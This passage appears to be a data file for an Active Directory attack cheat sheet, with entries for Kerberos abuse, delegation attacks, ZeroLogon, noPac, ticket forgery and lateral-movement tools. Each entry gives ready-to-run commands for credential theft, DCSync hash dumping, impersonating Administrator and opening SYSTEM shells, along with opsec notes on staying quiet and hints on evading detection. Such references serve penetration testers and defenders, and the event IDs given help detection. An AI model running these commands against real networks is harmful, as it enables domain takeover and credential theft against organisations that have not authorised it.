    requires: ['GenericWrite/GenericAll over the target msDS-KeyCredentialLink', 'AD CS deployed for PKINIT (enterprise CA / KDC cert); with no CA the attack does not work'],
    versions: ['srv2016', 'srv2019', 'srv2022', 'srv2025'],
    affects: 'Key Trust / msDS-KeyCredentialLink mapping requires a Server 2016+ DC (the attribute and PKINIT key-trust support landed in 2016).',
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Shadow Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.html' },
      { label: 'SpecterOps, Shadow Credentials', url: 'https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/' },{ label: 'The Hacker Recipes, Shadow Credentials', url: 'https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials' }],
    opsec: 'Stealthier than a password reset (no lockout, attribute restored after use), but the key-credential write and PKINIT logon are auditable. Clean up the msDS-KeyCredentialLink value afterward.',
  },
  {
    id: 'targeted-kerberoast',
    aliases: ['WriteSPN', 'WriteServicePrincipalName'],
    label: 'Targeted Kerberoasting',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Set a temp SPN on a controlled user, then roast it.',
    description:
      'With GenericWrite/GenericAll over a target user that has no SPN, temporarily set a servicePrincipalName, request a TGS, then remove the SPN. The TGS is encrypted with the target password hash and cracked offline, turning a write-ACL edge into a credential.',
    tools: [
      { name: 'targetedKerberoast', url: 'https://github.com/ShutdownRepo/targetedKerberoast' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Set SPN, roast, then clean up', code: r`targetedKerberoast.py -d domain.local -u user -p pass --request-user TARGET --dc-ip 10.0.0.1`, lang: 'bash' },
      { label: 'Write a fake SPN on the victim (bloodyAD)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 set object victim servicePrincipalName -v 'fake/svc'`, lang: 'bash' },
      { label: 'Clear the SPN afterward (no value deletes it)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 set object victim servicePrincipalName`, lang: 'bash' },
    ],
    requires: ['GenericWrite/GenericAll, or WriteProperty/Validated-SPN on servicePrincipalName, over the target user', 'Target password crackable offline'],
    mitre: mitre('T1558.003'),
    references: [
      { label: 'HackTricks, Kerberoast', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html' },{ label: 'The Hacker Recipes, Targeted Kerberoasting', url: 'https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting' }],
    opsec: 'The SPN write logs 5136 only where Directory Service Changes auditing + a SACL are configured (off by default), so it is frequently absent; the TGS request (4769, with RC4/etype 0x17) is the more dependable signal. The tool removes the SPN automatically, but the brief change is detectable; cracking is offline.',
  },
  {
    id: 'constrained-delegation',
    aliases: ['AllowedToDelegate'],
    label: 'Constrained Delegation (S4U2Proxy)',
    phase: 'lateral-movement',
    needs: 'domain-user',
    summary: 'Abuse KCD to impersonate any user to allowed SPNs.',
    description:
      'An account configured for constrained delegation (msDS-AllowedToDelegateTo) can use S4U2Self + S4U2Proxy to get a service ticket impersonating an arbitrary user to the allowed SPNs. Arbitrary-user impersonation from just the account key requires protocol transition (the TRUSTED_TO_AUTH_FOR_DELEGATION flag). With Kerberos-only KCD (the flag absent), S4U2Self returns a non-forwardable ticket and S4U2Proxy rejects it, so you need a genuine forwardable TGS for the target, or CVE-2020-17049 (Bronze Bit) to force forwardable. If you hold that account key and protocol transition is set, impersonate Administrator to the target service. The alt-service trick widens the SPN reached. Privilege split: the S4U abuse itself only needs the configured account\'s key, but *writing* msDS-AllowedToDelegateTo or the TRUSTED_TO_AUTH_FOR_DELEGATION flag requires SeEnableDelegationPrivilege on the DC, held by Domain Admins by default, so the configure commands below are a DA-level setup/persistence step rather than a low-priv escalation. The delegation attribute an ordinary principal can write (when they control the target computer object) is the resource-based one, msDS-AllowedToActOnBehalfOfOtherIdentity; that RBCD write is the domain-user-reachable path.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'getST (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'S4U with Rubeus', code: r`Rubeus.exe s4u /user:websvc$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt`, lang: 'powershell' },
      { label: 'S4U with Impacket getST', code: r`getST.py -spn cifs/target.domain.local -impersonate Administrator -hashes :<HASH> domain.local/websvc$`, lang: 'bash' },
      { label: 'Configure the delegation target (bloodyAD), needs SeEnableDelegationPrivilege (DA)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 set object 'attacker$' msDS-AllowedToDelegateTo -v 'cifs/target.domain.local'`, lang: 'bash' },
      { label: 'Enable protocol transition (bloodyAD), needs SeEnableDelegationPrivilege (DA)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add uac 'attacker$' -f TRUSTED_TO_AUTH_FOR_DELEGATION`, lang: 'bash' },
    ],
    requires: ['Control of an account with msDS-AllowedToDelegateTo set', "That account's hash/key"],
    mitre: mitre('T1558'),
    references: [
      { label: 'HackTricks, Constrained Delegation', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html' },{ label: 'harmj0y (with Lee Christensen), S4U2Pwnage', url: 'https://blog.harmj0y.net/activedirectory/s4u2pwnage/' },{ label: 'The Hacker Recipes, Constrained Delegation', url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained' }],
    opsec: 'S4U2Self/S4U2Proxy TGS requests (4769) for a sensitive impersonated user are detectable. The alt-service SPN-substitution trick (e.g. cifs vs host) expands access beyond the configured SPN.',
  },
  {
    id: 'rbcd',
    label: 'Resource-Based Constrained Delegation',
    phase: 'lateral-movement',
    needs: 'domain-user',
    summary: 'Write msDS-AllowedToActOnBehalfOfOtherIdentity -> impersonate.',
    description:
      'If you can write a target computer msDS-AllowedToActOnBehalfOfOtherIdentity, point it at a machine account you control (default MachineAccountQuota allows 10), then use S4U2Self+S4U2Proxy to impersonate almost any user (except accounts in Protected Users or marked sensitive/not-delegatable, which need a ticket-modification bypass) to that host. A common outcome of a GenericWrite/GenericAll edge over a computer or an LDAP relay. The controlling principal does not actually need an SPN: pairing S4U2self with a User-to-User (U2U) request yields the impersonation ticket even from a controlled user account, and RBCD can be written on the DC\'s OWN computer object to impersonate Administrator straight to the DC.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'Impacket (addcomputer/rbcd/getST)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add rbcd <target$> <attacker$>', lang: 'bash' },
      { label: 'Add a controlled machine account', code: r`addcomputer.py -computer-name 'evil$' -computer-pass 'Passw0rd!' domain.local/user:pass -dc-ip 10.0.0.1`, lang: 'bash' },
      { label: 'Write RBCD on the target computer', code: r`rbcd.py -delegate-to 'TARGET$' -delegate-from 'evil$' -action write domain.local/user:pass`, lang: 'bash' },
      { label: 'Get an impersonation ticket', code: r`getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/evil$:'Passw0rd!'`, lang: 'bash' },
      { label: 'SPN-less variant: delegate FROM a user you control (no machine account). Multi-step dance that temporarily corrupts the user password: set the NT hash to the TGT session key so S4U2self does not fail with KDC_ERR_S_PRINCIPAL_UNKNOWN, then reset it', code: r`rbcd.py -delegate-to 'TARGET$' -delegate-from 'user' -action write domain.local/user:pass
getTGT.py domain.local/user:pass   # note the Ticket Session Key from the .ccache
changepasswd.py 'domain.local/user@10.0.0.1' -newhashes :<SESSION_KEY>   # set NT hash = session key
export KRB5CCNAME=user.ccache
getST.py -spn cifs/target.domain.local -impersonate Administrator -self -u2u -k -no-pass domain.local/user
changepasswd.py 'domain.local/user@10.0.0.1' -newhashes :<ORIGINAL_HASH>   # restore the user's hash`, lang: 'bash' },
      { label: 'Abuse configured RBCD to impersonate (NetExec)', code: r`nxc smb <target> -u 'attacker$' -H <hash> --delegate Administrator`, lang: 'bash' },
    ],
    requires: ['Write over the target computer msDS-AllowedToActOnBehalfOfOtherIdentity', 'A principal to delegate from: a machine account you create/control, or (SPN-less variant) any user whose password you can set'],
    mitre: mitre('T1134'),
    references: [
      { label: 'HackTricks, Resource-based Constrained Delegation', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html' },
      { label: 'Shenanigans Labs (Elad Shamir), Wagging the Dog (RBCD)', url: 'https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html' },
      { label: 'James Forshaw (tiraniddo), Exploiting RBCD Using a Normal User Account', url: 'https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html' },
      { label: 'The Hacker Recipes, RBCD', url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd' }],
    opsec: 'Machine-account creation (4741), the delegation write (5136), and S4U requests (4769) are all logged. Setting MachineAccountQuota to 0 mitigates the account-creation step.',
  },
  {
    id: 'acl-addallowedtoact',
    aliases: ['AllowedToAct', 'WriteAccountRestrictions'],
    label: 'AddAllowedToAct',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Write msDS-AllowedToActOnBehalfOfOtherIdentity -> RBCD.',
    description: "AddAllowedToAct is the BloodHound edge for the granular right to write a computer's msDS-AllowedToActOnBehalfOfOtherIdentity, which is exactly what configures resource-based constrained delegation. It is a subset of GenericWrite/GenericAll over the computer: you need only this one property write, not full control. Point it at a principal you control, then run S4U2Self+S4U2Proxy to impersonate almost any user (except accounts in Protected Users or flagged sensitive/cannot-be-delegated; the RID 500 Administrator is the usual exception) to that host. The full chain, including the SPN-less-user variant, is covered under RBCD.",
    tools: [
      { name: 'Impacket (rbcd/getST)', url: 'https://github.com/fortra/impacket' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Write the RBCD attribute (rbcd.py)', code: r`rbcd.py -delegate-to 'TARGET$' -delegate-from 'evil$' -action write domain.local/user:pass`, lang: 'bash' },
    ],
    requires: ['Write over the target computer msDS-AllowedToActOnBehalfOfOtherIdentity (the BloodHound AddAllowedToAct edge)'],
    mitre: mitre('T1098'),
    references: [
      { label: 'SpecterOps, BloodHound AddAllowedToAct edge', url: 'https://bloodhound.specterops.io/resources/edges/add-allowed-to-act' },
      { label: 'The Hacker Recipes, RBCD', url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd' },
      { label: 'Shenanigans Labs (Elad Shamir), Wagging the Dog (RBCD)', url: 'https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html' },
    ],
    opsec: 'If Directory Service Changes auditing and a SACL are configured, the write generates 5136 (and 4662 on {3f78c3e5-f79a-46bd-a0b8-9d18116ddc79}); by default neither is enabled, so the write is often silent. Note that flushing/removing the attribute afterwards emits another modify event and does not erase prior logs.',
  },
  {
    id: 'overpass-the-hash',
    label: 'OverPass-the-Hash',
    phase: 'lateral-movement',
    needs: 'domain-user',
    summary: 'Turn an NT hash (or AES key) into a Kerberos TGT.',
    description:
      'Instead of NTLM Pass-the-Hash, use a captured NT hash or AES key to request a Kerberos TGT ("pass the key"), then operate over Kerberos. Blends in better than NTLM and enables Pass-the-Ticket.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'getTGT (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Request a TGT from an NT hash (Rubeus)', code: r`Rubeus.exe asktgt /user:Administrator /rc4:<NTHASH> /domain:domain.local /ptt`, lang: 'powershell' },
      { label: 'Request a TGT from a hash (Impacket)', code: r`getTGT.py domain.local/Administrator -hashes :<NTHASH>`, lang: 'bash' },
    ],
    requires: ['An NT hash or AES key for the target account'],
    mitre: mitre('T1550.002'),
    opsec: 'Quieter than NTLM PtH, but an AS-REQ using RC4 when the account supports AES is anomalous. Prefer the AES key (/aes256) where available. Export KRB5CCNAME to the minted .ccache so downstream -k / --use-kcache tooling picks it up, and if the KDC returns KRB_AP_ERR_SKEW prefer wrapping the call in faketime (no clock change needed, often the only option in containers / without root), or sync the host clock to the DC with chrony / ntpsec-ntpdate (ntpdate itself is gone from current distros).',
    references: [
      { label: 'HackTricks, OverPass-the-Hash / Pass-the-Key', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.html' },
      { label: 'Duckwall & Delpy, Abusing Microsoft Kerberos (Black Hat USA 2014 whitepaper)', url: 'https://blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It-wp.pdf' },
    ],
  },
  {
    id: 'pass-the-ticket',
    label: 'Pass-the-Ticket',
    phase: 'lateral-movement',
    needs: 'domain-user',
    summary: 'Inject a stolen/forged Kerberos ticket into a session.',
    description:
      'Reuse a Kerberos ticket (TGT or TGS) you stole from memory or forged (silver/golden) by injecting it into a logon session: authenticate as that principal with no password. On Windows the ticket is loaded with Rubeus/Mimikatz (.kirbi); on Linux the same idea is "pass-the-cache", where you point KRB5CCNAME at a .ccache (converting formats with impacket ticketConverter if needed). Operating over Kerberos from a Linux box has three setup prerequisites that bite first: the DC must be reachable by FQDN (add it to /etc/hosts so SPNs canonicalize), a krb5.conf for the realm must exist, and the host clock must sit within five minutes of the DC or the KDC returns KRB_AP_ERR_SKEW.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'Impacket (ticketConverter)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Inject a ticket on Windows (Rubeus)', code: r`Rubeus.exe ptt /ticket:ticket.kirbi`, lang: 'powershell' },
      { label: 'Pass-the-cache on Linux (.ccache)', code: r`export KRB5CCNAME=/tmp/ticket.ccache && psexec.py -k -no-pass -dc-ip <dc-ip> domain.local/Administrator@dc01.domain.local`, lang: 'bash' },
      { label: 'Convert .kirbi <-> .ccache', code: r`ticketConverter.py ticket.kirbi ticket.ccache`, lang: 'bash' },
      { label: 'Kerberos setup: generate a krb5.conf for the realm', code: r`netexec smb dc01.domain.local -u user -p 'Password' --generate-krb5-file /etc/krb5.conf`, lang: 'bash' },
      { label: 'Kerberos setup: fix clock skew to the DC (avoid KRB_AP_ERR_SKEW)', code: r`faketime -f +Nh <auth-command>   # no root/NTP; or one-shot sync: sudo chronyd -q 'server dc01.domain.local iburst' (ntpdate is gone from Debian 13/Kali)`, lang: 'bash' },
    ],
    requires: ['A valid stolen or forged Kerberos ticket (.kirbi or .ccache)'],
    mitre: mitre('T1550.003'),
    references: [
      { label: 'HackTricks, Pass the Ticket', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html' },
      { label: 'MITRE ATT&CK, Pass the Ticket (T1550.003)', url: 'https://attack.mitre.org/techniques/T1550/003/' },
    ],
    opsec: 'Ticket use itself is normal Kerberos; anomalies come from lifetime, encryption type, or a TGT appearing on an unexpected host. Match realistic lifetimes/etypes.',
  },
  {
    id: 'silver-ticket',
    label: 'Silver Ticket',
    phase: 'lateral-movement',
    needs: 'domain-user',
    summary: "Forge a TGS from a service account's hash.",
    description:
      "With a service account's password hash (e.g. from Kerberoasting or a machine account), forge a TGS directly for that service SPN: no KDC interaction, so it never touches a DC. Scoped to one service on one host but stealthy and offline to create. Because you control the PAC, you can inject privileged group SIDs (extra-SIDs such as Domain Admins 512, or a custom group RID) so the service authorises you as a member of groups you are not in: this is how one service-account hash yields admin-equivalent access on that service, e.g. an MSSQL OPENROWSET(BULK) file read or a privileged SMB session.",
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Forge a silver ticket (Impacket)', code: r`ticketer.py -nthash <SVC_HASH> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local Administrator`, lang: 'bash' },
      { label: 'Forge + inject (Rubeus)', code: r`Rubeus.exe silver /service:cifs/target.domain.local /rc4:<SVC_HASH> /user:Administrator /domain:domain.local /sid:<SID> /ptt`, lang: 'powershell' },
    ],
    requires: ['The target service account hash (NT or AES)', 'Domain SID'],
    mitre: mitre('T1558.002'),
    opsec: 'No DC contact at forge time; detection relies on host-side TGS anomalies and (where enabled) PAC validation. A forged PAC without a real AS/TGS exchange can be caught by KDC PAC checks. An RC4-based silver ticket may fail with KRB_AP_ERR_MODIFIED on RC4-disabled / AES-only services, so use the AES key (Rubeus /aes256, ticketer -aesKey) there.',
    references: [
      { label: 'HackTricks, Silver Ticket', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html' },
      { label: 'ADSecurity (Sean Metcalf), How Attackers Use Kerberos Silver Tickets to Exploit Systems', url: 'https://adsecurity.org/?p=2011' },
    ],
  },
  {
    id: 'zerologon',
    label: 'ZeroLogon (CVE-2020-1472)',
    phase: 'priv-esc',
    needs: 'none',
    summary: "Netlogon flaw resets the DC machine password to empty.",
    description:
      "A cryptographic flaw in Netlogon's AES-CFB8 use lets an unauthenticated attacker with network access to a DC set its machine account password to empty, then DCSync to dump all hashes. It breaks the DC secure channel until you restore the original password, so use with care.",
    tools: [
      { name: 'CVE-2020-1472 PoC (dirkjanm)', url: 'https://github.com/dirkjanm/CVE-2020-1472' },
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec (zerologon)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Set DC machine password to empty', code: r`cve-2020-1472-exploit.py DC01 10.0.0.1`, lang: 'bash' },
      { label: 'DCSync with the empty machine account', code: r`secretsdump.py -just-dc -no-pass 'domain.local/DC01$@10.0.0.1'`, lang: 'bash' },
      { label: 'Check if the DC is vulnerable (NetExec, no creds)', code: r`nxc smb <dc-ip> -M zerologon`, lang: 'bash' },
    ],
    requires: ['Network access to an unpatched DC (pre Aug-2020 patch)'],
    versions: ['srv2008', 'srv2012', 'srv2016', 'srv2019'],
    affects: 'Server 2008 R2 through Server 2019 DCs (Netlogon, before the Aug-2020 patch); disclosed before Server 2022 shipped.',
    mitre: mitre('T1068'),
    references: [
      {
        label: 'Secura, Zerologon whitepaper (Tom Tervoort, original research)',
        url: 'https://www.secura.com/uploads/whitepapers/Zerologon.pdf',
      },
      {
        label: 'Microsoft MSRC, CVE-2020-1472 advisory (with ADV200085 enforcement guidance)',
        url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472',
      },
    ],
    opsec: 'High-signal: the defining IoC is a Security event 4742 (computer account changed / machine-account password reset) performed by ANONYMOUS LOGON, followed by System/Netlogon 5805 errors once the secure channel breaks, plus the DC password change. Emptying the DC password breaks replication, so always restore the original machine password afterward.',
  },
  {
    id: 'nopac',
    label: 'noPac (CVE-2021-42278/42287)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'sAMAccountName spoofing -> impersonate a DC.',
    description:
      'Chaining CVE-2021-42278 (no validation of the trailing $ on a machine account name) and CVE-2021-42287 (KDC retries with a trailing $), a low-priv user creates a machine account, renames it to a DC name, gets a TGT, then drops the rename so S4U2self returns a ticket as a DC. Standard-user to Domain Admin in one chain.',
    tools: [
      { name: 'noPac', url: 'https://github.com/Ridter/noPac' },
      { name: 'Impacket', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec (nopac)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Scan and exploit', code: r`noPac.py domain.local/user:pass -dc-ip 10.0.0.1 -dc-host DC01 --impersonate Administrator -dump`, lang: 'bash' },
      { label: 'Check a DC for noPac (NetExec)', code: r`nxc smb <dc-ip> -u user -p pass -M nopac`, lang: 'bash' },
    ],
    requires: ['Any valid domain account', 'MachineAccountQuota > 0 (to create a machine account) OR control of an existing machine account', 'Unpatched DC (pre Nov-2021 patch)'],
    versions: ['srv2008', 'srv2012', 'srv2016', 'srv2019', 'srv2022'],
    affects: 'Server 2008 SP2 through Server 2022 DCs, before the Nov-2021 patch (KB5008102 for CVE-2021-42278, KB5008380 for CVE-2021-42287).',
    mitre: mitre('T1068'),
    references: [
      {
        label: 'exploit.ph, CVE-2021-42278/42287 weaponisation (Charlie Clark, original writeup)',
        url: 'https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html',
      },
      {
        label: 'Microsoft KB5008102, SAM hardening (CVE-2021-42278)',
        url: 'https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e',
      },
    ],
    opsec: 'Machine-account creation/rename (4741/4781) and DC-name collisions are detectable. Setting MachineAccountQuota to 0 and patching close the path.',
  },
  {
    id: 'winrm-evil',
    aliases: ['CanPSRemote'],
    label: 'WinRM Execution',
    phase: 'lateral-movement',
    needs: 'creds',
    summary: 'Interactive shell over WinRM (5985/5986).',
    description:
      'With credentials/hash and the target Remote Management Users membership, evil-winrm gives an interactive PowerShell session over WinRM. Cleaner than service-based exec and supports pass-the-hash and Kerberos auth.',
    tools: [
      { name: 'evil-winrm', url: 'https://github.com/Hackplayers/evil-winrm' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Connect with a password', code: r`evil-winrm -i 10.0.0.20 -u Administrator -p 'Passw0rd!'`, lang: 'bash' },
      { label: 'Connect via pass-the-hash', code: r`evil-winrm -i 10.0.0.20 -u Administrator -H <NTHASH>`, lang: 'bash' },
    ],
    requires: ['Local admin or Remote Management Users membership', 'WinRM enabled (5985/5986)'],
    mitre: mitre('T1021.006'),
    opsec: 'WinRM logons create 4624 type-3 events and PowerShell/WinRM operational logs; if Script Block Logging (4104) is enabled it captures the deobfuscated commands (off by default, but common in hardened/EDR-monitored estates). Blend with admin activity windows.',
    references: [
      { label: 'HackTricks, WinRM (Lateral Movement)', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/winrm.html' },
    ],
  },
  {
    id: 'wmiexec',
    label: 'WMI Exec',
    phase: 'lateral-movement',
    needs: 'local-admin',
    summary: 'Semi-interactive exec over WMI (135/DCOM).',
    description:
      "Impacket's wmiexec runs commands via WMI over DCOM/RPC, returning output through a temp file on ADMIN$: no service is created, so it is quieter than psexec. Supports pass-the-hash and Kerberos.",
    tools: [
      { name: 'wmiexec (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Semi-interactive WMI shell', code: r`wmiexec.py domain.local/Administrator:'Passw0rd!'@10.0.0.20`, lang: 'bash' },
      { label: 'Pass-the-hash', code: r`wmiexec.py -hashes :<NTHASH> domain.local/Administrator@10.0.0.20`, lang: 'bash' },
    ],
    requires: ['Local admin on the target', 'RPC/DCOM (135) + SMB (445) reachable'],
    mitre: mitre('T1047'),
    opsec: 'No service event (quieter than psexec), but WMI process creation, the ADMIN$ temp file, and 4624 type-3 logons are detectable. Defenders flag wmiexec command-line patterns.',
    references: [
      { label: 'HackTricks, WmiExec (Lateral Movement)', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/wmiexec.html' },
    ],
  },
  {
    id: 'dcom-exec',
    aliases: ['ExecuteDCOM'],
    label: 'DCOM Exec',
    phase: 'lateral-movement',
    needs: 'local-admin',
    summary: 'Code execution via DCOM objects (e.g. MMC20).',
    description:
      'Certain DCOM objects (MMC20.Application, ShellWindows, ShellBrowserWindow) expose methods that spawn processes, allowing remote execution over DCOM/RPC (135 + dynamic ports). DCOM lateral movement is less commonly monitored, but by default dcomexec.py still grabs command output over SMB (ADMIN$), so with 445 blocked the command runs but cannot retrieve output; use -silentcommand/-nooutput for truly SMB-free blind execution.',
    tools: [{ name: 'dcomexec (Impacket)', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Exec via a DCOM object (pass a command; with none it drops to a semi-interactive shell)', code: r`dcomexec.py -object MMC20 domain.local/Administrator:'Passw0rd!'@10.0.0.20 whoami`, lang: 'bash' },
    ],
    requires: ['Local admin on the target', 'DCOM/RPC (135 + dynamic ports) reachable'],
    mitre: mitre('T1021.003'),
    opsec: 'DCOM lateral movement is less commonly monitored, but the child process spawns from a named parent that is easy to hunt: MMC20.Application spawns mmc.exe (launched with -Embedding, child of svchost.exe / DcomLaunch), while ShellWindows / ShellBrowserWindow execute under explorer.exe, alongside 4624 type-3 logons. mmc.exe spawning cmd/powershell is a high-signal, low-noise detection, so "less monitored" understates the MMC20 risk. Object availability varies by Windows version.',
    references: [
      { label: 'HackTricks, DCOMExec (Lateral Movement)', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/dcomexec.html' },
      { label: 'enigma0x3 (Matt Nelson), Lateral Movement using the MMC20.Application COM Object', url: 'https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/' },
    ],
  },
  {
    id: 'psexec',
    label: 'PsExec / Service Exec',
    phase: 'lateral-movement',
    needs: 'local-admin',
    summary: 'SYSTEM shell via a service over SMB (445).',
    description:
      "The loud but reliable classic. Drop a binary to ADMIN$ and register + start a Windows service through the SCM over SMB/RPC, running as SYSTEM. Impacket's psexec.py drops a SYSTEM shell by default; Sysinternals PsExec needs -s for SYSTEM (without it the remote process runs in the context of the connecting user). Impacket's psexec.py supports pass-the-hash (-hashes) and Kerberos (-k); Sysinternals PsExec takes only a plaintext password.",
    tools: [
      { name: 'psexec (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'Sysinternals PsExec', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/psexec' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'SYSTEM shell with a password', code: r`psexec.py domain.local/Administrator:'Passw0rd!'@10.0.0.20`, lang: 'bash' },
      { label: 'Pass-the-hash', code: r`psexec.py -hashes :<NTHASH> domain.local/Administrator@10.0.0.20`, lang: 'bash' },
    ],
    requires: ['Local admin on the target', 'SMB (445) + ADMIN$ reachable'],
    mitre: mitre('T1021.002'),
    opsec: 'The loudest of the exec family: a service install (System 7045 / Security 4697) plus the dropped binary on ADMIN$. Impacket psexec.py installs a RemComSvc-based service with a randomized binary (still a 7045/4697 service-install event), while Sysinternals leaves the fixed PSEXESVC name. The service install is loud either way, so prefer wmiexec or atexec when stealth matters.',
    references: [
      { label: 'HackTricks, PsExec / WinExec', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/psexec-and-winexec.html' },
    ],
  },
  {
    id: 'smbexec',
    label: 'SMBExec',
    phase: 'lateral-movement',
    needs: 'local-admin',
    summary: 'Semi-interactive SMB shell, no binary dropped.',
    description:
      "Impacket's smbexec spawns a temporary service that runs each command through cmd.exe and pipes the output back over SMB: no service EXE is dropped (unlike PsExec), sidestepping the PE payload binary. It is not fileless though: smbexec still writes a per-command batch file (a random .bat) and an __output capture file to disk on the target. Runs as SYSTEM and supports pass-the-hash; the trade-off is a service created per command.",
    tools: [
      { name: 'smbexec (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Semi-interactive SYSTEM shell', code: r`smbexec.py domain.local/Administrator:'Passw0rd!'@10.0.0.20`, lang: 'bash' },
      { label: 'Pass-the-hash', code: r`smbexec.py -hashes :<NTHASH> domain.local/Administrator@10.0.0.20`, lang: 'bash' },
    ],
    requires: ['Local admin on the target', 'SMB (445) reachable'],
    mitre: mitre('T1021.002'),
    opsec: 'No PE payload binary on disk, but a service is created per command (repeated 7045), noisy in the event log. smbexec stages to C$ (the default -share), where an __output file and a batch file appear (in C:\\Windows or C:\\Windows\\Temp), usually auto-deleted but left behind on failure; unlike PsExec there is no ADMIN$ EXE staging. Defenders signature the smbexec service-name/command pattern.',
    references: [
      { label: 'HackTricks, PsExec / SMBExec family', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/psexec-and-winexec.html' },
      { label: 'Impacket, smbexec.py source', url: 'https://github.com/fortra/impacket/blob/master/examples/smbexec.py' },
    ],
  },
  {
    id: 'atexec',
    label: 'Scheduled-Task Exec',
    phase: 'lateral-movement',
    needs: 'local-admin',
    summary: 'Run as SYSTEM via a remote scheduled task.',
    description:
      "Impacket's atexec registers a one-shot scheduled task through the Task Scheduler service (MS-TSCH) over the \\pipe\\atsvc named pipe on SMB, runs it as SYSTEM, captures the output, and deletes the task: no service install, so it is quieter than PsExec. A fallback when service-based exec is blocked or closely watched.",
    tools: [
      { name: 'atexec (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Run a command as SYSTEM', code: r`atexec.py domain.local/Administrator:'Passw0rd!'@10.0.0.20 whoami`, lang: 'bash' },
      { label: 'Pass-the-hash', code: r`atexec.py -hashes :<NTHASH> domain.local/Administrator@10.0.0.20 whoami`, lang: 'bash' },
    ],
    requires: ['Local admin on the target', 'SMB (445 or 139) reachable'],
    mitre: mitre('T1053.005'),
    opsec: "If 'Audit Other Object Access Events' is enabled, task create/delete raise Security 4698/4699; otherwise the activity is only in the Microsoft-Windows-TaskScheduler/Operational log (106/140/141). Not audited to Security by default. No service event and no binary drop, so quieter than PsExec, but scheduled-task artifacts are well-monitored.",
